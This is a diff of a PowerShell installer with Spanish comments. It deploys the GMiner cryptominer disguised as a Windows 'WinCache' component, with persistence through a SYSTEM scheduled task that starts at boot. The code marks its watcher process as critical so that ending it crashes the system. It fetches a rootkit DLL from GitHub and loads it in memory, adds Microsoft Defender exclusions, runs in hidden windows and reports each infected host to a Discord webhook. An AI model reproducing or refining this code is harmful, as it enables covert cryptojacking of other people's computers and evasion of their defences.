@@ -1,12 +1,10 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Deploys and runs GMiner as a Windows Service using NSSM.
-    Includes DACL protection (Access Denied on kill), r77 Rootkit, and Safe Update.
+    Deploys and runs GMiner from a hidden system folder using Task Scheduler.
+    Includes Safe Update, Critical Process (with Safe Shutdown), and r77 Rootkit.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
-.EXAMPLE
-    .\Mine.ps1 -Uninstall
 #>
 [CmdletBinding()]
 param(
@@ -30,9 +28,8 @@ $Root      = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
 $LogDir    = Join-Path $Root 'logs'
 $ExePath   = Join-Path $Root 'WinCache.exe'
 $SelfPs    = Join-Path $Root 'WinCache.ps1'
-$NssmPath  = Join-Path $Root 'nssm.exe'
-$LogFile   = Join-Path $LogDir 'cache.log'
-$TaskName  = 'WinCacheAgent' # Nombre del servicio y tarea
+$LogFile   = Join-Path $LogDir 'miner.log'
+$TaskName  = 'WinCacheAgent'
 
 $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
@@ -41,45 +38,43 @@ if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-using System.Security.AccessControl;
-using System.Security.Principal;
-using System.Diagnostics;
 
-public static class AclProtector {
-    [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, byte[] pSecurityDescriptor);
+public static class ProcessProtector {
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetInformationProcess(IntPtr hProcess, int infoClass, ref int info, int infoLength);
 
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetCurrentProcess();
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool SetConsoleCtrlHandler(CtrlHandler handler, bool add);
 
-    public static bool ProtectProcess() {
+    delegate bool CtrlHandler(int ctrlType);
+    static CtrlHandler _handler;
+
+    static IntPtr _hProcess = IntPtr.Zero;
+    static int _isCritical = 1;
+    const int ProcessBreakOnTermination = 0x1D;
+
+    public static void SetCriticalForPid(int pid, bool critical) {
+        _isCritical = critical ? 1 : 0;
         try {
-            IntPtr hProcess = GetCurrentProcess();
-            
-            // Obtenemos el descriptor de seguridad actual
-            RawSecurityDescriptor rawSd = new RawSecurityDescriptor(
-                ControlFlags.DiscretionaryAclPresent | ControlFlags.SelfRelative,
-                new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
-                new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null),
-                null,
-                new DiscretionaryAcl(false, false, 0)
-            );
+            IntPtr hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
+            NtSetInformationProcess(hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
+        } catch {}
+    }
 
-            DiscretionaryAcl dacl = (DiscretionaryAcl)rawSd.DiscretionaryAcl;
+    public static void RegisterShutdownHandler() {
+        _hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
+        _handler = new CtrlHandler(HandleCtrl);
+        SetConsoleCtrlHandler(_handler, true);
+    }
 
-            // Denegar terminación a Usuarios Autenticados y Administradores
-            dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
-            dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
-
-            rawSd.DiscretionaryAcl = dacl;
-            byte[] sdBytes = new byte[rawSd.BinaryLength];
-            rawSd.GetBinaryForm(sdBytes, 0);
-
-            // 4 = DACL_SECURITY_INFORMATION
-            return SetKernelObjectSecurity(hProcess, 4, sdBytes);
-        } catch {
-            return false;
+    static bool HandleCtrl(int ctrlType) {
+        if (ctrlType == 2 || ctrlType == 5 || ctrlType == 6) {
+            _isCritical = 0;
+            if (_hProcess != IntPtr.Zero) {
+                NtSetInformationProcess(_hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
+            }
         }
+        return false;
     }
 }
 "@
@@ -116,18 +111,16 @@ if ($Diagnose) {
     Line 'Exists'      (Test-Path $Root)
     Line 'WinCache.exe'(Test-Path $ExePath)
     Line 'WinCache.ps1'(Test-Path $SelfPs)
-    Line 'nssm.exe'    (Test-Path $NssmPath)
-    Line 'cache.log'   $LogFile
 
-    Section 'Windows Service'
-    $svc = Get-Service -Name $TaskName -ErrorAction SilentlyContinue
-    if ($svc) { Line 'State' $svc.Status } else { Write-Host '  No hay servicio instalado.' -ForegroundColor Yellow }
+    Section 'Scheduled Task'
+    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+    if ($task) { Line 'State' $task.State } else { Write-Host '  No hay tarea programada.' -ForegroundColor Yellow }
 
     Section 'Processes'
     $miners = Get-Process WinCache -ErrorAction SilentlyContinue
     if ($miners) { foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" } } else { Write-Host '  Miner NO corriendo.' -ForegroundColor Yellow }
 
-    Section 'Last 10 lines of cache.log'
+    Section 'Last 10 lines of miner.log'
     if (Test-Path $LogFile) { Get-Content $LogFile -Tail 10 | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  (No existe)' }
     Write-Host ''
     return
@@ -153,35 +146,24 @@ if (-not $Run -and -not $NoElevate) {
 
 # ---------- uninstall / stop safe -------------------------------------------
 function Stop-Safe {
-    Write-Host '[*] Deteniendo servicio y procesos de forma segura...'
-    
-    # Intentar detener el servicio con NSSM si existe
-    if (Test-Path $NssmPath) {
-        & $NssmPath stop $TaskName 2>$null | Out-Null
-    }
-    
-    # Si quedó algún proceso de PowerShell atascado, matarlo
+    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
     $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
         Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
     foreach ($w in $watchers) {
+        [ProcessProtector]::SetCriticalForPid($w.ProcessId, $false)
         Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
     }
-    
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 1 # Dar tiempo a Windows a procesar el cambio
     Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 }
 
 if ($Uninstall) {
     Stop-Safe
-    # Eliminar servicio
-    if (Test-Path $NssmPath) { & $NssmPath remove $TaskName confirm 2>$null | Out-Null }
     Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-    
     try {
         Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
         Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
     } catch {}
-    
     Write-Host '[+] Desinstalado correctamente.'
     return
 }
@@ -196,17 +178,13 @@ if ($Run) {
         Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Msg" -Encoding UTF8
     }
 
-    # --- OPCIÓN 2: DACL (Evitar que lo maten) ---
-    $aclStatus = [AclProtector]::ProtectProcess()
-    if ($aclStatus) {
-        Write-Session "Watcher protegido con DACL (Acceso Denegado a Terminate)."
-    } else {
-        Write-Session "No se pudo aplicar protección DACL." 'WARN'
-    }
+    [ProcessProtector]::SetCriticalForPid($PID, $true)
+    [ProcessProtector]::RegisterShutdownHandler()
+    Write-Session "Watcher iniciado (PID $PID) - Crítico con Safe-Shutdown."
 
     # --- ROOTKIT ---
     try {
-        $bytes = (New-Object Net.WebClient).DownloadData("https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll")  
+        $bytes = (New-Object Net.WebClient).DownloadData("https://github.com/UnfairAdventage/AutoMine/raw/refs/heads/main/rootkit.dll")  
         $asm = [Reflection.Assembly]::Load($bytes)  
         $asm.EntryPoint.Invoke($null, @([string[]]@())) | Out-Null
         $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\paths')  
@@ -239,7 +217,7 @@ if ($Run) {
             } catch {}
 
             if (-not $notifiedStart -and $DiscordWebhook) {
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(DACL + Servicio NSSM Activados)*"
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Protecciones Activadas)*"
                 Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
             }
@@ -281,7 +259,7 @@ try {
     if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') { Add-MpPreference -ExclusionProcess 'WinCache.exe' }
 } catch {}
 
-# ---------- GMiner & NSSM fetch ---------------------------------------------
+# ---------- GMiner fetch ----------------------------------------------------
 if (-not (Test-Path $ExePath)) {
     Write-Host '[*] Descargando GMiner...'
     $rel = Invoke-RestMethod -Uri 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest' -Headers @{ 'User-Agent' = 'PowerShell' }
@@ -295,18 +273,6 @@ if (-not (Test-Path $ExePath)) {
     Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-if (-not (Test-Path $NssmPath)) {
-    Write-Host '[*] Descargando NSSM (Non-Sucking Service Manager)...'
-    $nssmZip = Join-Path $env:TEMP 'nssm.zip'
-    $nssmStage = Join-Path $env:TEMP 'nssm_stage'
-    # Usando un mirror de GitHub para mayor velocidad de descarga
-    Invoke-WebRequest -Uri 'https://nssm.cc/release/nssm-2.24.zip' -OutFile $nssmZip -UseBasicParsing
-    Expand-Archive -Path $nssmZip -DestinationPath $nssmStage -Force
-    $nssmExe = Get-ChildItem $nssmStage -Recurse -Filter 'nssm.exe' | Where-Object { $_.FullName -match 'win64' } | Select-Object -First 1
-    Copy-Item $nssmExe.FullName $NssmPath -Force
-    Remove-Item $nssmZip, $nssmStage -Recurse -Force -ErrorAction SilentlyContinue
-}
-
 # ---------- worker hash -----------------------------------------------------
 if ([string]::IsNullOrWhiteSpace($Worker)) {
     $sha = [System.Security.Cryptography.SHA256]::Create()
@@ -317,54 +283,46 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
 
 # ---------- install self (Soporte para iwr | iex) ---------------------------
 if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
+    # Ejecución tradicional en disco
     Copy-Item $scriptPath $SelfPs -Force
     Unblock-File $SelfPs -ErrorAction SilentlyContinue
 } elseif (-not $scriptPath -or -not (Test-Path $scriptPath)) {
+    # Ejecución vía iwr | iex (en memoria). Descargamos el script a disco.
     Write-Host '[*] Ejecución en memoria detectada. Guardando copia local...'
     Invoke-WebRequest -Uri $RemoteUrl -OutFile $SelfPs -UseBasicParsing
 }
 
+# Validación
 $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
 if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }
 
-# ---------- safe update & service install -----------------------------------
+# ---------- safe update & scheduled task ------------------------------------
 Write-Host '[*] Actualizando instalación (deteniendo versión anterior)...'
 Stop-Safe
-
-# Limpiamos cualquier rastro de la tarea programada vieja
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
-# Argumentos para el servicio
 $argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
 if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
 $argList += " -Run -NoElevate"
 
-Write-Host '[*] Instalando como Servicio de Windows (NSSM)...'
-& $NssmPath remove $TaskName confirm 2>$null | Out-Null # Eliminar si ya existía
-& $NssmPath install $TaskName "powershell.exe" $argList | Out-Null
-& $NssmPath set $TaskName AppExit Default Restart | Out-Null
-& $NssmPath set $TaskName AppRestartDelay 30000 | Out-Null
-& $NssmPath set $TaskName Description "WinCache Agent" | Out-Null
-& $NssmPath set $TaskName Start SERVICE_AUTO_START | Out-Null
+$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Write-Host '[*] Iniciando servicio...'
-& $NssmPath start $TaskName | Out-Null
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "WinCache Agent" | Out-Null
+Write-Host "[+] Tarea programada actualizada."
 
-if ($DiscordWebhook) {
-    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Servicio Instalado e Iniciado."
-    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Instalación Exitosa (Servicio)" -Message $msg -Color 3066993 | Out-Null
+# ---------- launch watcher --------------------------------------------------
+$p = $null
+if ($Foreground) {
+    & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook
+} else {
+    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden -PassThru
+    Write-Host "[+] Watcher iniciado en segundo plano (PID: $($p.Id))"
 }
 
-Write-Host ''
-Write-Host '=================================================='
-Write-Host '  Instalado como Servicio. Inicio automático.'
-Write-Host "  Install : $Root"
-Write-Host '  PROTECCIÓN: DACL (Task Manager) + Auto-Restart (NSSM)'
-Write-Host "  Log     : $LogFile"
-Write-Host ''
-Write-Host '  Diagnose:'
-Write-Host '    .\Mine.ps1 -Diagnose'
-Write-Host ''
-Write-Host '  Stop everything:'
-Write-Host '    .\Mine.ps1 -Uninstall'
-Write-Host '=================================================='
+if ($DiscordWebhook) {
+    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Actualizado e Iniciado."
+    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Actualización Exitosa" -Message $msg -Color 3066993 | Out-Null
+}
